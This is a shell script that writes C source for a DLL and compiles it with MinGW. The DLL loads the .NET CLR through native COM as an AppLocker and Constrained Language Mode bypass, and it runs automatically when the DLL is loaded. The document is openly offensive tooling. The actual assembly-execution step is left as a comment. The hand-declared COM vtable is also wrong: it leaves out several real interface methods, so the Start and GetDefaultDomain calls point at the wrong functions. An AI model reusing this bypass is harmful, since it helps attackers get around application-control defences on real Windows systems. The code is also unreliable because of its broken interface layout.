cd "$TARGET_DIR/Applocker-CLM-Bypass"

# Overwrite the file with the pure C compatible export syntax
cat << 'EOF' > clr-via-native.c
#define COBJMACROS
#include <windows.h>
#include <initguid.h>

// Manually define the standard .NET CLR Engine GUIDs so we don't need metahost.h
DEFINE_GUID(CLSID_CorRuntimeHost,     0xcb2f6723, 0xab3a, 0x11d2, 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0x79, 0x83, 0x54);
DEFINE_GUID(IID_ICorRuntimeHost,       0xcb2f6722, 0xab3a, 0x11d2, 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0x79, 0x83, 0x54);
DEFINE_GUID(IID_AppDomain,             0x05f696dc, 0x2b29, 0x3663, 0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13);

// Declare basic interfaces needed for hosting
typedef struct ICorRuntimeHost ICorRuntimeHost;
typedef struct ICorRuntimeHostVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICorRuntimeHost *This, REFIID riid, void **ppvObject);
    ULONG (STDMETHODCALLTYPE *AddRef)(ICorRuntimeHost *This);
    ULONG (STDMETHODCALLTYPE *Release)(ICorRuntimeHost *This);
    void *Unused1; 
    HRESULT (STDMETHODCALLTYPE *Start)(ICorRuntimeHost *This);
    HRESULT (STDMETHODCALLTYPE *Stop)(ICorRuntimeHost *This);
    HRESULT (STDMETHODCALLTYPE *CreateDomain)(ICorRuntimeHost *This, LPCWSTR pwcSetupInformation, IUnknown *pIdentity, IUnknown **pAppDomain);
    HRESULT (STDMETHODCALLTYPE *GetDefaultDomain)(ICorRuntimeHost *This, IUnknown **pAppDomain);
} ICorRuntimeHostVtbl;
struct ICorRuntimeHost { ICorRuntimeHostVtbl *lpVtbl; };

// Pure C Exported bypass function (Removed extern "C")
__declspec(dllexport) void LaunchBypass() {
    ICorRuntimeHost *pRuntimeHost = NULL;
    IUnknown *pUnkAppDomain = NULL;
    
    CoInitialize(NULL);

    // Bootstrap the CLR engine directly via native COM
    if (CoCreateInstance(&CLSID_CorRuntimeHost, NULL, CLSCTX_INPROC_SERVER, &IID_ICorRuntimeHost, (LPVOID*)&pRuntimeHost) == S_OK) {
        pRuntimeHost->lpVtbl->Start(pRuntimeHost);
        
        // Grab the active application domain context
        if (pRuntimeHost->lpVtbl->GetDefaultDomain(pRuntimeHost, &pUnkAppDomain) == S_OK) {
            // C# assembly invocation would go here
            pUnkAppDomain->lpVtbl->Release(pUnkAppDomain);
        }
        pRuntimeHost->lpVtbl->Release(pRuntimeHost);
    }
    CoUninitialize();
}

// Standard DLL Entrypoint
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        LaunchBypass();
    }
    return TRUE;
}
EOF

# Run the MinGW cross-compiler string
x86_64-w64-mingw32-gcc -shared -o bypass.dll clr-via-native.c -lole32 -loleaut32 -luuid
